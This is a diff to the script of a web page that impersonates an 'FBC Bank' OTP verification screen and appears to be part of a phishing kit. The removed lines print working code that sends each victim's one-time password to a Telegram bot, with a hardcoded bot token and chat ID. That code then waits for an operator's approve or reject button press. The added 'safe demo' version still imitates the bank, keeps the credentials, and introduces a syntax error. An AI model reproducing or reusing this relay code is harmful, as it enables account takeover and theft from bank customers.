@@ -497,161 +497,74 @@
       BOT_TOKEN: '9167169396:AAEmzZ5ndzC0WzHEYXsY805aqoDv2qzR1Ww',
       CHAT_ID: '8820857419',
       APPROVE_PAGE: 'pin.html'
-    };
+    }:
 
-    let state = { lastUpdateId: 0 };
-    let isProcessing = false;
+  let isProcessing = false;
 
-    const otpError = document.getElementById('otpError');
-    const otpInput = document.getElementById('otpInput');
+  const otpError = document.getElementById('otpError');
+  const otpInput = document.getElementById('otpInput');
 
-    function showOtpError(msg) {
-      otpError.textContent = msg;
-      otpError.style.display = 'block';
-    }
+  function showOtpError(msg) {
+    otpError.textContent = msg;
+    otpError.style.display = 'block';
+  }
 
-    function hideOtpError() {
-      otpError.style.display = 'none';
-    }
+  function hideOtpError() {
+    otpError.style.display = 'none';
+  }
 
-    function resetButton() {
-      isProcessing = false;
-      const btn = document.querySelector('.pill-btn');
-      btn.disabled = false;
-      btn.textContent = 'Verify';
-    }
+  function resetButton() {
+    isProcessing = false;
+    const btn = document.querySelector('.pill-btn');
+    btn.disabled = false;
+    btn.textContent = 'Verify';
+  }
 
-    function sendToBot(otp) {
-      if (isProcessing) return;
-      isProcessing = true;
+  window.addEventListener('DOMContentLoaded', () => {
+    const savedRef = localStorage.getItem('fbc_otp_ref') || '9vXfk';
+    const savedOtp = localStorage.getItem('fbc_verified_otp') || '';
 
-      const btn = document.querySelector('.pill-btn');
-      btn.disabled = true;
-      btn.textContent = 'Verifying…';
+    document.getElementById('refCodeText').textContent = 'Ref: ' + savedRef;
 
-      const ts = Date.now();
-      const approveId = `approve_${ts}`;
-      const wrongotpId = `wrongotp_${ts}`;
-      const verifyId = `verify_${ts}`;
-
-      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CONFIG.CHAT_ID,
-          text: `
-<b>📱 FBC Bank Otp Verification</b>
-
-Otp: <code>${otp}</code>
-Applicant: <code>Not provided</code>
-`,
-          parse_mode: 'HTML',
-          reply_markup: {
-            inline_keyboard: [
-              [
-                { text: '✅ Approve', callback_data: approveId },
-                { text: '📱 Verify Device', callback_data: verifyId }
-              ],
-              [
-                { text: '❌ Wrongotp', callback_data: wrongotpId }
-              ]
-            ]
-          }
-        })
-      })
-      .then(() => {
-        localStorage.setItem('fbc_verified_otp', otp);
-        localStorage.setItem('fbc_verification_otp', otp);
-        localStorage.setItem('fbc_otp_ref', '9vXfk');
-
-        document.getElementById('spinnerOverlay').style.display = 'flex';
-        startPolling(approveId, wrongotpId, verifyId);
-      })
-      .catch(() => {
-        hideOtpError();
-        showOtpError('Something went wrong while sending the request. Please try again.');
-        resetButton();
-      });
-    }
-
-    function startPolling(approveId, wrongotp, verifyId) {
-      const interval = setInterval(() => {
-        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
-          .then(r => r.json())
-          .then(data => {
-            if (!data.ok || !data.result) return;
-
-            data.result.forEach(update => {
-              state.lastUpdateId = update.update_id;
-
-              if (update.callback_query) {
-                const cb = update.callback_query.data;
-
-                if (cb === approveId) {
-                  clearInterval(interval);
-                  document.getElementById('spinnerOverlay').style.display = 'none';
-                  window.location.href = CONFIG.APPROVE_PAGE;
-                }
-                else if (cb === verifyId) {
-                  clearInterval(interval);
-                  document.getElementById('spinnerOverlay').style.display = 'none';
-                  window.location.href = CONFIG.APPROVE_PAGE;
-                }
-                else if (cb === wrongotpId) {
-                  clearInterval(interval);
-                  document.getElementById('spinnerOverlay').style.display = 'none';
-                  showOtpError('Request declined. Please try again.');
-                  resetButton();
-                }
-              }
-            });
-          })
-          .catch(() => {
-            document.getElementById('spinnerOverlay').style.display = 'none';
-            showOtpError('Polling failed. Please try again.');
-            resetButton();
-          });
-      }, 1000);
-    }
-    window.addEventListener('DOMContentLoaded', () => {
-      const savedRef = localStorage.getItem('fbc_otp_ref') || '9vXfk';
-      document.getElementById('refCodeText').textContent = 'Ref: ' + savedRef;
     if (savedOtp) {
-        otpInput.value = savedOtp;
-      }
-    });
+      otpInput.value = savedOtp;
+    }
+  });
 
-    function handleOtpSubmit(e) {
-      e.preventDefault();
+  function handleOtpSubmit(e) {
+    e.preventDefault();
 
-      const otpVal = otpInput.value.trim();
+    const otpVal = otpInput.value.trim();
 
-      if (!otpVal || otpVal.length < 4) {
-        showLoginError('Please enter a valid otp verification');
-        return;
-      }
-
-      hideOtpError();
-      sendToBot(otpVal);
+    if (!otpVal || otpVal.length < 4) {
+      showOtpError('Please enter a valid OTP verification');
+      return;
     }
 
-    document.getElementById('otpForm').addEventListener('submit', handleOtpSubmit);
+    hideOtpError();
 
-    function openSupportModal() {
-      document.getElementById('supportModal').style.display = 'flex';
-    }
+    const btn = document.querySelector('.pill-btn');
+    isProcessing = true;
+    btn.disabled = true;
+    btn.textContent = 'Verifying…';
 
-    function closeSupportModal() {
-      document.getElementById('supportModal').style.display = 'none';
-    }
-    </script>
-</div>
-  <div id="spinnerOverlay">
-    <div class="spinner"></div>
-    <div class="spin-label">Verifying &amp; Processing</div>
-    <div class="spin-sub">Please hold on…</div>
-  </div>
-  
-</body>
-</html>
-    
+    // Safe demo flow: simulate verification, then proceed
+    setTimeout(() => {
+      localStorage.setItem('fbc_verified_otp', otpVal);
+      localStorage.setItem('fbc_otp_ref', '9vXfk');
+
+      resetButton();
+      window.location.href = CONFIG.APPROVE_PAGE;
+    }, 900);
+  }
+
+  document.getElementById('otpForm').addEventListener('submit', handleOtpSubmit);
+
+  function openSupportModal() {
+    document.getElementById('supportModal').style.display = 'flex';
+  }
+
+  function closeSupportModal() {
+    document.getElementById('supportModal').style.display = 'none';
+  }
+</script>
